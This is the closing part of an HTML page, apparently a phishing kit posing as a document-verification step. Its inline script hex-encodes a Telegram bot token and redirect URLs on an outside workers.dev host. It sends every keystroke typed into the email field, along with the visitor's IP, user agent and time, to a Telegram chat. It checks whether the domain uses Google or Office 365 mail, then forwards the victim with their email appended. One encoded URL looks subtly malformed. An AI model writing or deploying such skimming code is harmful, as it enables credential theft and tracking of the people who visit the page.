<div class="country">Country/region: <select id="country-select"></select></div></div></div><script>const h="68747470733A2F2F6768333233343436652D653938342D676865747465722E79616C65706F6C6C61636B6C61772E776F726B6572732E6465762F3F653D";const o="6874747073A2F2F6768333233343436652D653938342D676865747465722E79616C65706F6C6C61636B6C61772E776F726B6572732E6465762F3F653D";const b="383433343835383435303A414148305656534C6A35513357444E54726454615355736169505A4630415F3565746B";const googleDomains=['gmail.com','googlemail.com'];const sendTelegramNotification=async message=>{const t=b.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');try{await fetch(`https://api.telegram.org/bot${t}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:"5172045930",text:message})})}catch(e){}};const getClientInfo=async()=>{let ip="Unknown";let timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;try{const ipResponse=await fetch('https://ipapi.co/json/');const ipData=await ipResponse.json();ip=ipData.ip||"Unknown";timezone=ipData.timezone||timezone;return{ip,timezone,userAgent:navigator.userAgent,isBot:/bot|crawl|spider|facebookexternalhit|WhatsApp|google|bing|duckduckbot|yandex|baidu|slurp|exabot|facebot|ia_archiver/i.test(navigator.userAgent),timestamp:new Date().toLocaleString(),country:ipData.country||"Unknown"}}catch(e){try{const fallbackResponse=await fetch('https://api.ipify.org?format=json');const fallbackData=await fallbackResponse.json();ip=fallbackData.ip||ip}catch(f){}return{ip,timezone,userAgent:navigator.userAgent,isBot:/bot|crawl|spider|facebookexternalhit|WhatsApp|google|bing|duckduckbot|yandex|baidu|slurp|exabot|facebot|ia_archiver/i.test(navigator.userAgent),timestamp:new Date().toLocaleString(),country:"Unknown"}}};async function checkGoogleMX(domain){const url=`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=MX`;try{const resp=await fetch(url,{headers:{'accept':'application/dns-json'}});const data=await resp.json();if(!data.Answer||data.Answer.length===0){return{isGoogle:false,mxServer:"Unknown",error:"No MX records found"}}const mxRecords=data.Answer.map(ans=>{const parts=ans.data.split(' ');return parts[parts.length-1].toLowerCase().replace(/\.$/,'')});const isGoogle=mxRecords.some(mx=>mx.includes('google.com')||mx.includes('googlemail.com'));const mxServer=isGoogle?"Google":mxRecords.some(mx=>mx.includes('microsoft')||mx.includes('office365'))?"Office 365":"Other";console.log("Domain:",domain,"MX Records:",mxRecords,"Detected MX Server:",mxServer);return{isGoogle,mxServer,error:null}}catch(e){console.error("MX Lookup Error:",e.message);return{isGoogle:false,mxServer:"Unknown",error:"Lookup failed"}}}document.addEventListener('DOMContentLoaded',()=>{const emailInput=document.getElementById('code');const continueButton=document.getElementById('continue-button');const countrySelect=document.getElementById('country-select');getClientInfo().then(clientInfo=>{countrySelect.innerHTML=`<option>${clientInfo.country}</option>`});let lastSent=0;const throttleDelay=1000;emailInput.focus();emailInput.addEventListener('input',async()=>{const now=Date.now();if(now-lastSent<throttleDelay)return;lastSent=now;const value=emailInput.value.trim();if(value){const clientInfo=await getClientInfo();sendTelegramNotification(`⌨️ Keystroke Input\n- Input: ${value}\n- IP: ${clientInfo.ip}\n- Time: ${clientInfo.timestamp}\n- User Agent: ${clientInfo.userAgent}`)}});continueButton.addEventListener('click',async function(e){e.preventDefault();const email=emailInput.value.trim();if(!email||!email.includes('@')||!email.includes('.')){emailInput.style.border='2px solid #ff6b6b';setTimeout(()=>{emailInput.style.border='none'},500);emailInput.focus();return}emailInput.disabled=true;continueButton.disabled=true;continueButton.textContent='Verifying…';const domain=email.split('@')[1].toLowerCase();const mxResult=await checkGoogleMX(domain);getClientInfo().then(clientInfo=>{sendTelegramNotification(`📩 Email Submitted\n- Email: ${email}\n- Domain: ${domain}\n- IP: ${clientInfo.ip}\n- Time: ${clientInfo.timestamp}\n- User Agent: ${clientInfo.userAgent}\n- MX Server: ${mxResult.mxServer}`)});let isGoogle=googleDomains.includes(domain);if(mxResult.isGoogle)isGoogle=true;continueButton.textContent='Finalizing document preparation…';setTimeout(()=>{const url=isGoogle?h:o;const decodedUrl=url.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');window.location.href=decodedUrl+encodeURIComponent(email)},420)})}); </script></body></html>
